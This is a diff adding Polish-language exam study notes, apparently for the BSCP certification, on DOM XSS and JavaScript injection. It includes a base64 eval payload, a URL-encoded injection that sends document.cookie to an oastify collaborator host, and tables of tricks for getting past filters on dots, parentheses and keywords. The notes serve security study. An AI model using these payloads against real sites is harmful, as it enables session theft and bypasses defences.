@@ -1,0 +1,25 @@
+Practise 1 — DOM XSS z base64 + eval
+javascript"-eval(atob('bG9jYXRpb249J2h0...'))-"
+Struktura: wartość w SearchTerm jest wstrzykiwana do kontekstu JS, gdzie cudzysłów " zamyka istniejący string, myślnik - działa jako operator (żeby JS nie rzucił błędu składni), eval(atob(...)) dekoduje i wykonuje payload base64.
+Co omija: filtr blokujący słowa kluczowe takie jak location, document, cookie w surowym tekście — bo w base64 nie ma tych słów. Kodowanie atob to jedna z najprostszych technik obejścia WAF/filtrów opartych na pattern matching.
+
+Practise 2 — JS injection z URL encoding
+%22};%20location=%22https://...oastify...%22%2bdocument.cookie;%20//
+Zdekodowane:
+javascript"}; location="https://...oastify..."+ document.cookie; //
+Struktura: " zamyka string, } zamyka blok (np. obiekt lub funkcję), średnik kończy instrukcję, potem nowa instrukcja location=... wykonuje redirect z ciasteczkiem, // komentuje resztę linii.
+Co omija: filtry sprawdzające surowy input — URL encoding (%22, %20, %2b) jest dekodowany przez przeglądarkę dopiero przy wykonaniu, więc surowy string może przejść przez walidację.
+
+Kiedy . jest blokowane, a () nie
+To częsty scenariusz na BSCP. Alternatywy:
+ZablokowaneAlternatywadocument.cookiedocument['cookie']location.hreflocation['href'] lub po prostu location=fetch(url)fetch\url`` (template literal)eval(...)eval\...``document.cookie przez .window['document']['cookie']
+Jeśli blokowane są też nawiasy ():
+javascript// zamiast eval(...)
+eval`kod`
+// zamiast fetch(url)
+fetch`url`
+// ostrożnie - template literals nie zawsze zachowują się jak nawiasy
+Jeśli blokowane są słowa kluczowe:
+javascript// zamiast document.cookie
+this['doc'+'ument']['coo'+'kie']
+// konkatenacja rozbija keyword
